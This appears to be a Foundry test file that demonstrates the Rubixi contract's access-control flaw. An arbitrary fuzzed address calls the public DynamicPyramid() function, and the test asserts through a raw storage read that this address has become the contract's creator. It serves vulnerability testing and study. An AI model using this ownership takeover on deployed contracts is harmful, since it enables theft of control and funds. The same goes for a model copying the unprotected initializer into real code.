
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Rubixi} from "../src/Rubixi.sol";

contract TestAccessControlRubixi is Test {
    Rubixi rubixi;

    function setUp() public {
        rubixi = new Rubixi();
        address owner = address(0x123);
        vm.prank(owner);
        rubixi.DynamicPyramid();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the current owner
        address currentCreator = address(uint160(vm.load(address(rubixi), bytes32(uint256(5)))));
        vm.assume(caller != currentCreator);

        // --- 2. State Configuration ---
        // No funding or additional state changes needed

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // TRIGGER VULNERABILITY
        rubixi.DynamicPyramid();
        
        // ASSERT SUCCESS
        // Check that creator has been updated to the caller
        address newCreator = address(uint160(vm.load(address(rubixi), bytes32(uint256(5)))));
        assertEq(newCreator, caller);
    }
}
